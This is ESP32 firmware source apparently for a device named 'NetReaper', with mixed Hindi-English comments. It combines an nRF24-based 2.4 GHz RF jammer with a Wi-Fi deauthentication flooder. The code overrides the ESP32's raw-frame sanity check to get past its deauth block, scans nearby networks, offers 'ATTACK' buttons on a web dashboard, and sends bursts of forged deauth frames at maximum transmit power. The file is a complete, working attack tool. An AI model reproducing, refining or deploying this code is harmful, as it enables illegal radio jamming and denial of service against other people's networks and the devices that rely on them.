#include <SPI.h>
#include <RF24.h>
#include <WiFi.h>
#include <WebServer.h>
#include "esp_bt.h"
#include "esp_wifi.h"
#include "esp_system.h"

// ================= ESP-IDF BYPASS (CRITICAL) =================
// Ye function ESP32 ke internal deauth block ko bypass karta hai
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0; 
}
// ==============================================================

// ================= PIN CONFIGURATION =================
const int rfButtonPin = 4;
const int rfLedPin = 2;
const int deauthButtonPin = 5;
const int deauthLedPin = 32;

bool isJamming = false;
bool isDeauthing = false;
bool scanExecuted = false;

bool isWebRfJamming = false;
unsigned long rfJamStartTime = 0;
unsigned long currentWebJamDuration = 0; 

WebServer server(80);
const char* apSSID = "NetReaper_Control";
const char* apPassword = "admin12345";
String networkListHTML = "";
String targetSSID = ""; 

SPIClass *sp = nullptr;
SPIClass *hp = nullptr;
RF24 radio(27, 33, 16000000); // CSN pin 15 se 33 kar diya (Safe Pin)
RF24 radio1(22, 21, 16000000);

int ch = 45;
int ch1 = 45;

struct WiFiNetwork { String ssid; uint8_t bssid[6]; int channel; int rssi; };

const uint8_t deauthPacket[26] = {
  0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x07, 0x00
};

int networkCount = 0;
int targetChannel = 1;
uint8_t targetBSSID[6];
WiFiNetwork scannedNetworks[20];
uint16_t seqNum = 0;

// ================= FORWARD DECLARATIONS =================
void stopDeauth();
void startJamming();
void stopJamming();
// ========================================================

void disableWiFiAndClassicBT() { esp_wifi_stop(); btStop(); }

// ================= RF JAMMER FUNCTIONS =================
void startJamming() {
  Serial.println("\n>>> RF JAMMER ON");
  digitalWrite(rfLedPin, HIGH);
  disableWiFiAndClassicBT(); 
  radio.powerUp(); radio.startConstCarrier(RF24_PA_MAX, ch);
  radio1.powerUp(); radio1.startConstCarrier(RF24_PA_MAX, ch1);
}

void stopJamming() {
  Serial.println("\n>>> RF JAMMER OFF");
  digitalWrite(rfLedPin, LOW);
  radio.powerDown(); radio1.powerDown();
  WiFi.mode(WIFI_OFF); delay(200);
  WiFi.mode(WIFI_AP_STA); delay(500);
  isWebRfJamming = false; 
}

void toggleJammerPhysical() {
  isJamming = !isJamming;
  isWebRfJamming = false; 
  if (isJamming) { 
      if(isDeauthing) stopDeauth();
      startJamming(); 
  } else { 
      stopJamming(); 
  }
}

void checkJammerButton() {
  static int lastState = HIGH; static unsigned long lastTime = 0;
  int currentState = digitalRead(rfButtonPin);
  if (currentState == LOW && lastState == HIGH && (millis() - lastTime) > 300) {
    lastTime = millis(); toggleJammerPhysical();
  }
  lastState = currentState;
}

void aggressiveRandomMode() { radio1.setChannel(random(80)); radio.setChannel(random(80)); }

// ================= DEAUTH FUNCTIONS =================
void startWiFiScan() {
  Serial.println("[*] Scanning...");
  WiFi.mode(WIFI_AP_STA); WiFi.disconnect(true); delay(100);
  networkCount = WiFi.scanNetworks();
  networkListHTML = ""; 

  if (networkCount > 0) {
    for (int i = 0; i < networkCount && i < 20; i++) {
      scannedNetworks[i].ssid = WiFi.SSID(i);
      memcpy(scannedNetworks[i].bssid, WiFi.BSSID(i), 6);
      scannedNetworks[i].channel = WiFi.channel(i);
      scannedNetworks[i].rssi = WiFi.RSSI(i);
      networkListHTML += "<tr><td>[" + String(i) + "]</td><td>" + scannedNetworks[i].ssid + "</td><td>Ch: " + String(scannedNetworks[i].channel) + "</td><td><a href='/deauth?idx=" + String(i) + "' class='btn-attack'>ATTACK</a></td></tr>";
    }
  } else { networkListHTML = "<tr><td colspan='4'>No networks found!</td></tr>"; }
  scanExecuted = true;
}

void startDeauth(int index) {
  if (index < 0 || index >= networkCount) return;
  memcpy(targetBSSID, scannedNetworks[index].bssid, 6);
  targetChannel = scannedNetworks[index].channel;
  targetSSID = scannedNetworks[index].ssid; 
  
  // CRITICAL: Promiscuous mode MUST be enabled for raw frame injection
  esp_wifi_set_promiscuous(true);
  
  // 🔥 AGGRESSIVE: Set WiFi TX Power to MAX (84 = 20dBm)
  esp_wifi_set_max_tx_power(84);
  
  WiFi.mode(WIFI_AP_STA); delay(100);
  esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  seqNum = 0;
  
  Serial.printf("[*] MAX AGGRESSIVE Deauth Started on '%s' (Channel: %d)\n", targetSSID.c_str(), targetChannel);
  digitalWrite(deauthLedPin, HIGH); isDeauthing = true;
}

void sendDeauth() {
  uint8_t packet[26];
  memcpy(packet, deauthPacket, 26);
  memcpy(&packet[10], targetBSSID, 6); // Source MAC (AP)
  memcpy(&packet[16], targetBSSID, 6); // BSSID (AP)
  
  packet[22] = seqNum & 0xFF;
  packet[23] = (seqNum >> 8) & 0xFF;
  seqNum++;

  // 🔥 MAXIMUM AGGRESSIVE MODE: 15 packets back-to-back (Pehle 3 tha, ab 15 hai)
  for (int i = 0; i < 15; i++) {
    esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  }
}

void stopDeauth() { 
  isDeauthing = false; 
  targetSSID = ""; 
  esp_wifi_set_promiscuous(false);
  digitalWrite(deauthLedPin, LOW); 
  Serial.println("[*] Deauth Stopped!");
}

void checkDeauthButton() {
  static int lastState = HIGH; static unsigned long lastTime = 0;
  int currentState = digitalRead(deauthButtonPin);
  if (currentState == LOW && lastState == HIGH && (millis() - lastTime) > 300) {
    lastTime = millis();
    if (!isDeauthing) {
      if (isJamming) { stopJamming(); isJamming = false; }
      WiFi.mode(WIFI_OFF); delay(200); WiFi.mode(WIFI_AP_STA); delay(500);
      if (!scanExecuted) { startWiFiScan(); if(networkCount>0) startDeauth(0); } 
      else { startDeauth(0); }
    } else { stopDeauth(); }
  }
  lastState = currentState;
}

// ================= WEB SERVER ROUTES =================
void handleRoot() {
  String statusText = "SYSTEM IDLE - READY";
  String statusColor = "#00ff00";
  String statusDetails = "";

  if (isJamming) {
    statusText = "RF JAMMING ACTIVE";
    statusColor = "#ffaa00";
    statusDetails = "<p style='color:#fff; margin-top:5px;'>WiFi Radio disabled. Press GPIO 4 to stop.</p>";
  } else if (isDeauthing) { 
    statusText = "MAX AGGRESSIVE DEAUTH ACTIVE";
    statusColor = "#ff0000";
    char bssidStr[18];
    sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X", targetBSSID[0], targetBSSID[1], targetBSSID[2], targetBSSID[3], targetBSSID[4], targetBSSID[5]);
    statusDetails = "<div style='background:#330000; padding:10px; border-radius:5px; border:1px solid #ff0000;'>";
    statusDetails += "<p style='color:#fff;'>Target: <b style='color:#ff5555;'>" + targetSSID + "</b> | Ch: <b>" + String(targetChannel) + "</b></p>";
    statusDetails += "<p style='color:#aaa; font-size:13px;'>BSSID: " + String(bssidStr) + "</p></div>";
  }

  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><meta http-equiv='refresh' content='2'>";
  html += "<style>body{background:#0a0a0a;color:#00ff00;font-family:monospace;text-align:center;padding:15px;}";
  html += "h1{color:#ff3333;text-shadow:0 0 10px #ff0000;} .status-box{background:#1a1a1a; border:2px solid " + statusColor + "; padding:20px; border-radius:10px; margin-bottom:20px;}";
  html += ".status-title{font-size:1.5em; color:" + statusColor + "; font-weight:bold;} .btn{display:inline-block;width:42%;margin:4px;padding:12px;font-size:15px;color:#fff;background:#222;border:2px solid #00ff00;text-decoration:none;border-radius:8px;}";
  html += ".btn-full{display:block;width:90%;margin:10px auto;padding:15px;font-size:18px;color:#fff;background:#222;border:2px solid #00ff00;text-decoration:none;border-radius:8px;}";
  html += ".btn-attack{background:#ff0000;color:#fff;padding:8px 15px;text-decoration:none;border-radius:5px;} .btn-stop{background:#330000;border-color:#ff3333;color:#ff3333;} .btn-unlimited{border-color:#ffaa00;color:#ffaa00;}";
  html += "#countdown{font-size:2.5em;color:#ff3333;margin:20px 0;display:none;} table{width:100%;border-collapse:collapse;margin-top:15px;} th,td{border:1px solid #333;padding:10px;} th{color:#00ff00;} td{color:#ccc;}</style></head><body>";
  html += "<h1>NETREAPER DASHBOARD</h1><div class='status-box'><div class='status-title'>" + statusText + "</div>" + statusDetails + "</div>";
  html += "<a href='/scan' class='btn-full'>SCAN NETWORKS</a>";
  if (isDeauthing) html += "<a href='/deauth?idx=stop' class='btn-full btn-stop'>STOP DEAUTH ATTACK</a>";
  html += "<h3 style='color:#fff;'>RF JAMMER:</h3><div>";
  html += "<a href='#' class='btn' onclick='startJam(10)'>10s</a><a href='#' class='btn' onclick='startJam(30)'>30s</a>";
  html += "<a href='#' class='btn btn-unlimited' onclick='startJam(0)'>UNLIMITED</a></div><div id='countdown'></div>";
  html += "<h3 style='color:#fff;'>Targets:</h3><table><tr><th>ID</th><th>SSID</th><th>Ch</th><th>Action</th></tr>" + networkListHTML + "</table>";
  html += "<script>function startJam(s){fetch('/rf?time='+s);const d=document.getElementById('countdown');d.style.display='block';if(s==0){d.innerText='JAMMING (GPIO 4 to stop)';}else{let t=s;d.innerText='JAMMING '+t+'s';const i=setInterval(()=>{t--;if(t<=0){clearInterval(i);d.innerText='RECONNECTING...';setTimeout(()=>location.reload(),1500);}else{d.innerText='JAMMING '+t+'s';}},1000);}}</script></body></html>";
  server.send(200, "text/html", html);
}

void handleScan() { if (isJamming) stopJamming(); startWiFiScan(); server.sendHeader("Location", "/", true); server.send(302); }
void handleDeauth() { String idxStr = server.arg("idx"); if (idxStr == "stop") stopDeauth(); else { int idx = idxStr.toInt(); if (isJamming) { stopJamming(); isJamming = false; } startDeauth(idx); } server.sendHeader("Location", "/", true); server.send(302); }
void handleRFToggle() { String timeStr = server.arg("time"); int seconds = timeStr.toInt(); if (seconds >= 0) { if (isDeauthing) stopDeauth(); isJamming = true; startJamming(); if (seconds > 0) { isWebRfJamming = true; currentWebJamDuration = seconds * 1000; rfJamStartTime = millis(); } else { isWebRfJamming = false; } } server.send(200, "text/plain", "OK"); }

void handleSerial() {
  if (Serial.available()) {
    String command = Serial.readStringUntil('\n'); command.trim();
    if (command.equalsIgnoreCase("scan")) { if(isJamming) stopJamming(); startWiFiScan(); }
    else if (command.startsWith("deauth ")) { String arg = command.substring(7); if (arg == "off") stopDeauth(); else { if(isJamming) stopJamming(); startDeauth(arg.toInt()); } }
    else if (command.equalsIgnoreCase("rf")) { toggleJammerPhysical(); }
    else if (command.equalsIgnoreCase("rf off")) { if(isJamming) { isJamming=false; stopJamming(); } }
  }
}

void initSP() { sp = new SPIClass(VSPI); sp->begin(18, 19, 23, 21); radio1.begin(sp); radio1.setAutoAck(false); radio1.stopListening(); radio1.setPALevel(RF24_PA_MAX, true); radio1.setDataRate(RF24_2MBPS); radio1.setCRCLength(RF24_CRC_DISABLED); }
void initHP() { hp = new SPIClass(HSPI); hp->begin(14, 25, 13, 33); radio.begin(hp); radio.setAutoAck(false); radio.stopListening(); radio.setPALevel(RF24_PA_MAX, true); radio.setDataRate(RF24_2MBPS); radio.setCRCLength(RF24_CRC_DISABLED); }

void setup() {
  Serial.begin(115200); delay(1000); setCpuFrequencyMhz(240);
  pinMode(rfButtonPin, INPUT_PULLUP); pinMode(rfLedPin, OUTPUT); digitalWrite(rfLedPin, LOW);
  pinMode(deauthButtonPin, INPUT_PULLUP); pinMode(deauthLedPin, OUTPUT); digitalWrite(deauthLedPin, LOW);

  // 🔥 AGGRESSIVE: Set global max TX power on boot
  esp_wifi_set_max_tx_power(84); 

  initHP(); initSP(); radio.powerDown(); radio1.powerDown();
  
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(apSSID, apPassword);
  Serial.print("Connect to: "); Serial.println(apSSID);
  Serial.print("IP: "); Serial.println(WiFi.softAPIP());

  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/deauth", handleDeauth); 
  server.on("/rf", handleRFToggle);
  server.begin();
}

void loop() {
  server.handleClient(); 
  checkJammerButton(); checkDeauthButton(); handleSerial();

  if (isWebRfJamming && (millis() - rfJamStartTime >= currentWebJamDuration)) {
    Serial.println("[*] Web RF Jammer Auto-OFF. Reconnecting WiFi...");
    isJamming = false;
    stopJamming();
  }

  if (isJamming) aggressiveRandomMode();
  
  // 🔥 MAX SPEED DEAUTH: 5ms delay (20ms se bahut tez, par WDT crash se bachata hai)
  if (isDeauthing) { 
    sendDeauth(); 
    delay(5); 
  }
  
  yield(); 
}